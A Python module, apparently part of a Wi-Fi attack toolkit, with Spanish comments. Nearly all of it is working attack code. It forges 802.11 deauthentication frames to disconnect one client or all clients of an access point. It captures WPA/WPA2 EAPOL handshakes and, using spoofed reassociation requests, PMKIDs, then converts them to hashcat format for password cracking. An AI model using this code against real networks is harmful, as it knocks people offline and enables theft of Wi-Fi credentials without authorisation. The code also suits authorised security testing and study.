"""Ataques y reconocimiento 802.11 (Wi-Fi).

Requiere una tarjeta en MODO MONITOR. El escaneo escucha beacons y probe
responses saltando de canal, el deauth envia tramas de desautenticacion a un
cliente (o a broadcast) para expulsarlo del AP, y el capturador de handshakes
guarda el 4-way handshake EAPOL a un .pcap y lo convierte al formato de hashcat.

Pon la tarjeta en monitor antes de usar esto, por ejemplo:
    sudo airmon-ng start wlan0        # crea wlan0mon
  o bien:
    sudo ip link set wlan0 down
    sudo iw dev wlan0 set type monitor
    sudo ip link set wlan0 up
"""
import os
import random
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, Dot11ProbeResp,
    Dot11ReassoReq, EAPOL, PcapWriter, RadioTap, RandMAC, AsyncSniffer, sendp,
)
from scapy.utils import PcapReader

from core.bus import bus

# captures/ en la raiz del proyecto (app/modules/wifi.py -> ../../../captures)
CAPTURE_DIR = Path(__file__).resolve().parent.parent.parent / "captures"
CAPTURE_DIR.mkdir(exist_ok=True)
_ACTIVE_CAPTURE_PATHS: set[Path] = set()
_ACTIVE_CAPTURE_LOCK = threading.Lock()

# Mascaras de los bits del campo Key Information de EAPOL-Key.
KI_INSTALL = 0x0040
KI_ACK = 0x0080
KI_MIC = 0x0100
KI_SECURE = 0x0200


# Servicios que suelen impedir el modo monitor (lo mismo que airmon-ng check kill).
_INTERFERERS = (
    "NetworkManager",
    "wpa_supplicant",
    "wpa_cli",
    "dhclient",
    "dhcpcd",
    "avahi-daemon",
)

# Que servicios paramos en esta sesion, para poder devolverlos.
_killed: list[str] = []


def _run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True)


def iface_mode(iface: str) -> str:
    proc = _run(["iw", "dev", iface, "info"])
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if line.startswith("type "):
            return line.split()[1]
    return "?"


def list_wireless() -> list[dict]:
    base = "/sys/class/net"
    result = []
    if not os.path.isdir(base):
        return result
    for name in sorted(os.listdir(base)):
        if os.path.exists(f"{base}/{name}/wireless") or os.path.exists(f"{base}/{name}/phy80211"):
            result.append({"name": name, "mode": iface_mode(name)})
    return result


def kill_interferers() -> list[str]:
    """Para NetworkManager, wpa_supplicant y companeros que echan la interfaz
    del modo monitor. Equivale a `airmon-ng check kill`."""
    stopped = []
    for svc in _INTERFERERS:
        proc = _run(["systemctl", "stop", svc])
        if proc.returncode == 0 or "not loaded" not in (proc.stderr or "").lower():
            # pkill por si el unit no existe pero el proceso si
            _run(["pkill", "-f", svc])
            if svc not in _killed:
                _killed.append(svc)
            stopped.append(svc)
    # airmon-ng check kill por si hay algo mas (wpa_action, etc.)
    _run(["airmon-ng", "check", "kill"])
    bus.emit({"type": "wifi", "msg": "Servicios interferentes detenidos: " + ", ".join(stopped)})
    return stopped


def restore_interferers() -> list[str]:
    """Vuelve a levantar NetworkManager (y el resto) al salir de monitor."""
    started = []
    # NetworkManager relanza wpa_supplicant solo; no hace falta el resto.
    for svc in ("NetworkManager", "wpa_supplicant", "avahi-daemon"):
        proc = _run(["systemctl", "start", svc])
        if proc.returncode == 0:
            started.append(svc)
    _killed.clear()
    bus.emit({"type": "wifi", "msg": "Servicios de red restaurados: " + (", ".join(started) or "ninguno")})
    return started


def _parse_airmon_iface(output: str, fallback: str) -> str:
    # "(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)"
    for token in output.replace("[", " ").replace("]", " ").split():
        if token.endswith("mon") or token.endswith("mon0"):
            return token
    return fallback


def set_monitor(iface: str, enable: bool = True) -> dict:
    """Pone o saca la interfaz de modo monitor. Prefiere `iw` para no
    renombrar a wlan0mon; si falla, usa airmon-ng."""
    if not iface or "/" in iface or iface == "lo":
        raise ValueError("Interfaz invalida")
    if enable:
        current = iface_mode(iface)
        if current == "monitor":
            bus.emit({"type": "wifi", "msg": f"{iface} ya esta en modo monitor"})
            return {"interface": iface, "mode": "monitor", "created": iface}
        # Mismo nombre con iw (mas comodo para el selector).
        steps = [
            ["ip", "link", "set", iface, "down"],
            ["iw", "dev", iface, "set", "type", "monitor"],
            ["ip", "link", "set", iface, "up"],
        ]
        failed = False
        err = ""
        for cmd in steps:
            proc = _run(cmd)
            if proc.returncode != 0:
                failed = True
                err = (proc.stderr or proc.stdout or "").strip()
                break
        if not failed and iface_mode(iface) == "monitor":
            bus.emit({"type": "wifi", "msg": f"{iface} en modo monitor"})
            return {"interface": iface, "mode": "monitor", "created": iface}
        # Fallback: airmon-ng start (puede crear wlan0mon).
        proc = _run(["airmon-ng", "start", iface])
        created = _parse_airmon_iface((proc.stdout or "") + (proc.stderr or ""), iface)
        mode = iface_mode(created)
        if mode != "monitor" and proc.returncode != 0:
            raise RuntimeError(err or (proc.stderr or "No se pudo activar modo monitor").strip())
        bus.emit({"type": "wifi", "msg": f"Modo monitor en {created}"})
        return {"interface": created, "mode": iface_mode(created), "created": created}

    # Volver a managed
    current = iface_mode(iface)
    if current != "monitor" and not iface.endswith("mon"):
        bus.emit({"type": "wifi", "msg": f"{iface} ya esta en modo managed"})
        return {"interface": iface, "mode": current or "managed", "created": iface}
    if iface.endswith("mon"):
        proc = _run(["airmon-ng", "stop", iface])
        # airmon-ng stop wlan0mon suele devolver wlan0
        restored = iface[:-3] if iface.endswith("mon") else iface
        for token in ((proc.stdout or "") + " " + (proc.stderr or "")).split():
            if token.startswith("wlan") and not token.endswith("mon"):
                restored = token.strip("()[]")
                break
        bus.emit({"type": "wifi", "msg": f"{iface} detenida, interfaz {restored}"})
        return {"interface": restored, "mode": iface_mode(restored), "created": restored}
    for cmd in (
        ["ip", "link", "set", iface, "down"],
        ["iw", "dev", iface, "set", "type", "managed"],
        ["ip", "link", "set", iface, "up"],
    ):
        proc = _run(cmd)
        if proc.returncode != 0:
            raise RuntimeError((proc.stderr or "No se pudo volver a managed").strip())
    bus.emit({"type": "wifi", "msg": f"{iface} de vuelta a modo managed"})
    return {"interface": iface, "mode": iface_mode(iface), "created": iface}


def prepare_monitor(iface: str) -> dict:
    """Mata interferentes y activa modo monitor. Idempotente."""
    kill_interferers()
    return set_monitor(iface, True)


def set_channel(iface: str, channel: int) -> None:
    try:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


class WifiScanner:
    """Descubre APs (y de paso clientes) saltando por los canales 2.4 GHz."""

    def __init__(self, iface: str, channels=None, dwell: float = 0.4):
        self.iface = iface
        self.channels = channels or list(range(1, 14))
        self.dwell = dwell
        self._sniffer: AsyncSniffer | None = None
        self._hopper: threading.Thread | None = None
        self._stop = threading.Event()
        self.aps: dict[str, dict] = {}
        self.clients: dict[tuple[str, str], dict] = {}

    def _process(self, pkt) -> None:
        if not pkt.haslayer(Dot11):
            return
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt[Dot11].addr2
            if not bssid or bssid in self.aps:
                # Actualizamos senal pero no reemitimos para no inundar.
                if bssid in self.aps:
                    self.aps[bssid]["signal"] = self._signal(pkt)
                return
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                try:
                    ssid = pkt[Dot11Elt].info.decode(errors="ignore")
                except Exception:
                    ssid = ""
            enc = "WPA/WPA2" if b"\x30" in bytes(pkt) else "Abierta/WEP"
            ap = {
                "bssid": bssid,
                "ssid": ssid or "<oculto>",
                "channel": self._channel(pkt),
                "signal": self._signal(pkt),
                "enc": enc,
            }
            self.aps[bssid] = ap
            bus.emit({"type": "wifi_ap", **ap})
        self._track_client(pkt)

    def _track_client(self, pkt) -> None:
        """Registra estaciones asociadas inferidas de tramas 802.11 observadas."""
        dot11 = pkt[Dot11]
        bssid = client = None
        if int(dot11.type) == 2:  # data: DS bits indican AP <-> station
            fc = int(dot11.FCfield)
            to_ds, from_ds = bool(fc & 0x1), bool(fc & 0x2)
            if to_ds and not from_ds:
                bssid, client = dot11.addr1, dot11.addr2
            elif from_ds and not to_ds:
                bssid, client = dot11.addr2, dot11.addr1
        elif int(dot11.type) == 0 and int(dot11.subtype) in (0, 2):
            # Association Request / Reassociation Request.
            bssid, client = dot11.addr1, dot11.addr2

        if not bssid or not client or not is_unicast_mac(bssid) or not is_unicast_mac(client):
            return
        bssid, client = bssid.lower(), client.lower()
        if bssid == client:
            return
        key = (bssid, client)
        now = time.time()
        known = key in self.clients
        entry = self.clients.setdefault(key, {
            "bssid": bssid,
            "client": client,
            "channel": self.aps.get(bssid, {}).get("channel") or self._channel(pkt),
            "signal": self._signal(pkt),
            "last_seen": now,
        })
        entry["last_seen"] = now
        signal = self._signal(pkt)
        if signal is not None:
            entry["signal"] = signal
        if not known:
            bus.emit({"type": "wifi_client", **entry})

    def _signal(self, pkt):
        try:
            return int(pkt[RadioTap].dBm_AntSignal)
        except Exception:
            return None

    def _channel(self, pkt):
        try:
            frequency = int(pkt[RadioTap].ChannelFrequency)
            if frequency == 2484:
                return 14
            if 2412 <= frequency <= 2472:
                return (frequency - 2407) // 5
            if 5000 <= frequency <= 5900:
                return (frequency - 5000) // 5
        except Exception:
            pass
        try:
            return int(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return None

    def _hop(self):
        i = 0
        while not self._stop.is_set():
            set_channel(self.iface, self.channels[i % len(self.channels)])
            i += 1
            time.sleep(self.dwell)

    def start(self):
        self._stop.clear()
        self._sniffer = AsyncSniffer(iface=self.iface, prn=self._process, store=False)
        self._sniffer.start()
        self._hopper = threading.Thread(target=self._hop, daemon=True)
        self._hopper.start()
        bus.emit({"type": "wifi", "msg": f"Escaneo Wi-Fi activo en {self.iface}"})

    def stop(self):
        self._stop.set()
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        bus.emit({"type": "wifi", "msg": f"Escaneo Wi-Fi detenido ({len(self.aps)} APs)"})


class Deauther:
    """Envía una única ráfaga breve a un cliente unicast explícito."""

    def __init__(self, iface: str, bssid: str, client: str | None,
                 channel: int | None = None, burst: int = 64, interval: float = 0.5,
                 low_noise: bool = False, broadcast: bool = False):
        self.iface = iface
        self.bssid = bssid
        self.broadcast = broadcast
        self.client = (client or "").strip().lower()
        if not is_unicast_mac(bssid):
            raise ValueError("BSSID invalido")
        if broadcast:
            if self.client and self.client != "ff:ff:ff:ff:ff:ff":
                raise ValueError("En modo broadcast no se puede indicar un cliente individual")
            self.client = "ff:ff:ff:ff:ff:ff"
        elif not is_unicast_mac(self.client):
            raise ValueError("Selecciona un cliente unicast; activa broadcast solo si necesitas afectar a todos los clientes del AP")
        elif self.bssid.lower() == self.client:
            raise ValueError("El cliente objetivo no puede ser el BSSID del AP")
        self.bssid = self.bssid.lower()
        self.channel = channel
        # Una sola ráfaga: broadcast es una trama total; unicast son 2-3 por sentido.
        self.burst = 1 if broadcast else (2 if low_noise else max(1, min(3, burst)))
        self.interval = interval
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._running = False

    def _frames(self):
        # Una trama en cada sentido para cortar la asociacion por completo.
        to_client = RadioTap() / Dot11(addr1=self.client, addr2=self.bssid,
                                       addr3=self.bssid) / Dot11Deauth(reason=7)
        to_ap = RadioTap() / Dot11(addr1=self.bssid, addr2=self.client,
                                   addr3=self.bssid) / Dot11Deauth(reason=7)
        return to_client, to_ap

    def _run(self):
        try:
            if self.channel:
                set_channel(self.iface, self.channel)
            to_client, to_ap = self._frames()
            if not self._stop.is_set():
                sendp(to_client, iface=self.iface, count=self.burst, verbose=0)
            if not self.broadcast and not self._stop.is_set():
                time.sleep(min(self.interval, 0.25))
                sendp(to_ap, iface=self.iface, count=self.burst, verbose=0)
            mode = "broadcast AP-wide (1 trama; puede desconectar a todos)" if self.broadcast else f"dirigida a {self.client} ({self.burst} tramas por dirección)"
            bus.emit({"type": "wifi", "msg": f"Ráfaga completada en {self.bssid}: {mode}"})
        except Exception as e:
            bus.emit({"type": "error", "msg": f"Deauth falló: {e}"})
        finally:
            self._running = False

    def start(self):
        self._stop.clear()
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        mode = "broadcast AP-wide" if self.broadcast else f"dirigida a {self.client}"
        bus.emit({"type": "wifi", "msg": f"Ráfaga breve de deauth {mode} en {self.bssid}"})

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        bus.emit({"type": "wifi", "msg": "Deauth detenido"})

    @property
    def running(self) -> bool:
        return self._running


# --------------------------------------------------------------------------- #
# Conversion a formato hashcat y listado de capturas
# --------------------------------------------------------------------------- #
def convert_to_22000(pcap_path) -> dict:
    """Convierte un .pcap a formato hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL)."""
    pcap_path = Path(pcap_path)
    out = pcap_path.with_suffix(".22000")
    try:
        proc = subprocess.run(
            ["hcxpcapngtool", "-o", str(out), str(pcap_path)],
            capture_output=True, text=True,
        )
    except FileNotFoundError:
        raise RuntimeError(
            "hcxpcapngtool no esta instalado. Instalalo con: sudo apt install hcxtools"
        )
    hashes = 0
    if out.exists() and out.stat().st_size > 0:
        hashes = sum(1 for _ in out.open())
    return {
        "file": out.name,
        "ok": hashes > 0,
        "hashes": hashes,
        "log": (proc.stdout + proc.stderr).strip(),
    }


def list_captures() -> list[dict]:
    # Limpia capturas antiguas (p. ej. tras un crash) que solo contienen
    # beacons o están vacías. No toca una captura que siga activa.
    with _ACTIVE_CAPTURE_LOCK:
        active = set(_ACTIVE_CAPTURE_PATHS)
    for p in CAPTURE_DIR.glob("*.pcap"):
        if p in active or not p.name.startswith(("capture-", "pmkid-")):
            continue
        if not _pcap_has_eapol(p):
            _discard_capture(p)
    files = []
    for p in sorted(CAPTURE_DIR.glob("*"), key=lambda x: x.stat().st_mtime, reverse=True):
        if p.is_file():
            if (p.suffix.lower() == ".pcap"
                    and p.name.startswith(("capture-", "pmkid-"))
                    and not _pcap_has_eapol(p)):
                continue
            files.append({
                "name": p.name,
                "size": p.stat().st_size,
                "kind": p.suffix.lstrip(".") or "raw",
            })
    return files


def is_unicast_mac(value: str | None) -> bool:
    """True si es una MAC válida, no multicast ni broadcast."""
    try:
        parts = value.split(":")
        if len(parts) != 6 or any(len(part) != 2 for part in parts):
            return False
        octets = bytes(int(part, 16) for part in parts)
        return any(octets) and not (octets[0] & 1)
    except (AttributeError, ValueError):
        return False


def _pcap_has_eapol(path: Path) -> bool:
    try:
        reader = PcapReader(str(path))
        try:
            for packet in reader:
                if packet.haslayer(EAPOL):
                    return True
        finally:
            reader.close()
    except Exception:
        return False
    return False


def _discard_capture(path: Path) -> None:
    try:
        path.unlink(missing_ok=True)
        path.with_suffix(".22000").unlink(missing_ok=True)
        bus.emit({"type": "wifi", "msg": f"Captura descartada (sin paquetes EAPOL): {path.name}"})
    except OSError as e:
        bus.emit({"type": "error", "msg": f"No se pudo limpiar {path.name}: {e}"})


def _mark_capture(path: Path, active: bool) -> None:
    with _ACTIVE_CAPTURE_LOCK:
        if active:
            _ACTIVE_CAPTURE_PATHS.add(path)
        else:
            _ACTIVE_CAPTURE_PATHS.discard(path)


def _finish_capture(path: Path | None) -> None:
    if path is None:
        return
    _mark_capture(path, False)
    if not _pcap_has_eapol(path):
        _discard_capture(path)


class HandshakeCapturer:
    """Captura el 4-way handshake EAPOL de WPA/WPA2 y lo guarda a un .pcap.

    Al detectar un handshake completo emite un evento; si auto_convert esta
    activo, lo transforma al formato 22000 de hashcat automaticamente.
    """

    def __init__(self, iface: str, channel: int | None = None, auto_convert: bool = False):
        self.iface = iface
        self.channel = channel
        self.auto_convert = auto_convert
        self._sniffer: AsyncSniffer | None = None
        self._writer: PcapWriter | None = None
        self.pcap_path: Path | None = None
        self._aps: dict[str, str] = {}                     # bssid -> essid
        self._beacon_written: set[str] = set()
        self._msgs: dict[tuple[str, str], set[int]] = {}   # (bssid, client) -> {1,2,3,4}
        self._completed: set[tuple[str, str]] = set()

    @staticmethod
    def _eapol_message(key_info: int) -> int:
        mic = bool(key_info & KI_MIC)
        ack = bool(key_info & KI_ACK)
        secure = bool(key_info & KI_SECURE)
        if ack and not mic:
            return 1
        if mic and ack:
            return 3
        if mic and not ack:
            return 4 if secure else 2
        return 0

    def _record_ap(self, pkt) -> None:
        bssid = pkt[Dot11].addr3
        if not bssid:
            return
        essid = ""
        elt = pkt.getlayer(Dot11Elt)
        while isinstance(elt, Dot11Elt):
            if elt.ID == 0:
                try:
                    essid = elt.info.decode(errors="ignore")
                except Exception:
                    essid = ""
                break
            elt = elt.payload.getlayer(Dot11Elt)
        self._aps.setdefault(bssid, essid)
        # Guardamos un beacon por AP: hcxpcapngtool lo usa para el ESSID.
        if bssid not in self._beacon_written and self._writer:
            self._writer.write(pkt)
            self._beacon_written.add(bssid)

    def _handle_eapol(self, pkt) -> None:
        dot11 = pkt[Dot11]
        bssid = dot11.addr3
        if not bssid:
            return
        raw = bytes(pkt[EAPOL])
        if len(raw) < 7:
            return
        key_info = int.from_bytes(raw[5:7], "big")
        msg = self._eapol_message(key_info)
        if msg == 0:
            return
        client = dot11.addr1 if msg in (1, 3) else dot11.addr2
        if self._writer:
            self._writer.write(pkt)
        key = (bssid, client)
        self._msgs.setdefault(key, set()).add(msg)
        bus.emit({"type": "wifi_eapol", "bssid": bssid, "client": client, "msg": msg})

        seen = self._msgs[key]
        # Suficiente para crackear: M2 junto con M1 o M3.
        if key not in self._completed and 2 in seen and (1 in seen or 3 in seen):
            self._completed.add(key)
            essid = self._aps.get(bssid, "")
            bus.emit({
                "type": "handshake",
                "bssid": bssid,
                "essid": essid,
                "client": client,
                "file": self.pcap_path.name if self.pcap_path else "",
            })
            if self.auto_convert:
                threading.Thread(target=self._do_convert, args=(bssid, essid),
                                 daemon=True).start()

    def _do_convert(self, bssid: str, essid: str) -> None:
        try:
            res = convert_to_22000(self.pcap_path)
            bus.emit({"type": "hashcat", "bssid": bssid, "essid": essid, **res})
        except Exception as e:
            bus.emit({"type": "error", "msg": str(e)})

    def _process(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            self._record_ap(pkt)
        elif pkt.haslayer(EAPOL):
            self._handle_eapol(pkt)

    def start(self):
        if self.channel:
            set_channel(self.iface, self.channel)
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.pcap_path = CAPTURE_DIR / f"capture-{stamp}.pcap"
        self._writer = PcapWriter(str(self.pcap_path), append=True, sync=True)
        _mark_capture(self.pcap_path, True)
        self._sniffer = AsyncSniffer(iface=self.iface, prn=self._process, store=False)
        self._sniffer.start()
        bus.emit({"type": "wifi", "msg": f"Captura de handshakes en {self.iface} -> {self.pcap_path.name}"})

    def stop(self):
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        if self._writer:
            try:
                self._writer.close()
            except Exception:
                pass
        _finish_capture(self.pcap_path)
        bus.emit({"type": "wifi", "msg": "Captura de handshakes detenida"})


# KDE de PMKID (OUI 00:0F:AC, tipo 01) dentro del key data del EAPOL M1.
_PMKID_KDE = b"\x00\x0f\xac\x01"


class PmkidCapturer:
    """Captura el PMKID de un AP WPA/WPA2 SIN cliente y SIN deauth.

    Al estilo hcxdumptool: enviamos peticiones de reasociacion con una MAC
    cliente inventada; los AP con roaming/802.11r responden con un EAPOL M1
    que ya incluye el PMKID. El .pcap se convierte a hashcat 22000 igual que
    los handshakes. Mas sigiloso que deauthear a un cliente real.
    """

    def __init__(self, iface: str, bssid: str, channel: int | None = None,
                 auto_convert: bool = False, interval: float = 2.0, jitter: float = 1.5):
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.auto_convert = auto_convert
        self.interval = interval
        self.jitter = jitter
        self.client = str(RandMAC())
        self.essid = ""
        self._sniffer: AsyncSniffer | None = None
        self._writer: PcapWriter | None = None
        self._trigger: threading.Thread | None = None
        self._stop = threading.Event()
        self.pcap_path: Path | None = None
        self.found = False

    def _reassoc_frame(self):
        rsne = b"\x30\x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00"
        return (RadioTap() /
                Dot11(addr1=self.bssid, addr2=self.client, addr3=self.bssid) /
                Dot11ReassoReq(cap=0x0431, listen_interval=0x00c8,
                               current_AP="00:00:00:00:00:00") /
                Dot11Elt(ID=0, info=self.essid.encode() if self.essid else b"") /
                Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                Dot11Elt(ID=48, info=rsne))

    def _trigger_loop(self) -> None:
        while not self._stop.is_set():
            try:
                sendp(self._reassoc_frame(), iface=self.iface, count=1, verbose=0)
            except Exception:
                pass
            time.sleep(self.interval + random.uniform(0, self.jitter))

    def _is_m1(self, raw: bytes) -> bool:
        if len(raw) < 7:
            return False
        key_info = int.from_bytes(raw[5:7], "big")
        return bool(key_info & KI_ACK) and not bool(key_info & KI_MIC)

    def _process(self, pkt) -> None:
        dot11 = pkt[Dot11]
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            if dot11.addr3 == self.bssid and self._writer and not self.essid:
                elt = pkt.getlayer(Dot11Elt)
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 0:
                        self.essid = elt.info.decode(errors="ignore")
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
                self._writer.write(pkt)  # beacon para el ESSID
            return
        if not pkt.haslayer(EAPOL):
            return
        if dot11.addr2 != self.bssid and dot11.addr3 != self.bssid:
            return
        raw = bytes(pkt[EAPOL])
        if self._writer:
            self._writer.write(pkt)
        if self._is_m1(raw) and _PMKID_KDE in raw:
            self.found = True
            bus.emit({"type": "pmkid", "bssid": self.bssid, "essid": self.essid,
                      "file": self.pcap_path.name if self.pcap_path else ""})
            if self.auto_convert:
                threading.Thread(target=self._do_convert, daemon=True).start()
            self._stop.set()  # objetivo cumplido: dejamos de emitir

    def _do_convert(self) -> None:
        try:
            res = convert_to_22000(self.pcap_path)
            bus.emit({"type": "hashcat", "bssid": self.bssid, "essid": self.essid, **res})
        except Exception as e:
            bus.emit({"type": "error", "msg": str(e)})

    def start(self):
        if self.channel:
            set_channel(self.iface, self.channel)
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.pcap_path = CAPTURE_DIR / f"pmkid-{stamp}.pcap"
        self._writer = PcapWriter(str(self.pcap_path), append=True, sync=True)
        _mark_capture(self.pcap_path, True)
        self._sniffer = AsyncSniffer(iface=self.iface, prn=self._process, store=False)
        self._sniffer.start()
        self._stop.clear()
        self._trigger = threading.Thread(target=self._trigger_loop, daemon=True)
        self._trigger.start()
        bus.emit({"type": "wifi",
                  "msg": f"Captura PMKID en {self.iface} contra {self.bssid} "
                         f"(cliente {self.client}) -> {self.pcap_path.name}"})

    def stop(self):
        self._stop.set()
        if self._trigger:
            self._trigger.join(timeout=3)
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        if self._writer:
            try:
                self._writer.close()
            except Exception:
                pass
        _finish_capture(self.pcap_path)
        bus.emit({"type": "wifi", "msg": f"Captura PMKID detenida"
                + (" (PMKID obtenido)" if self.found else " (sin PMKID)")})
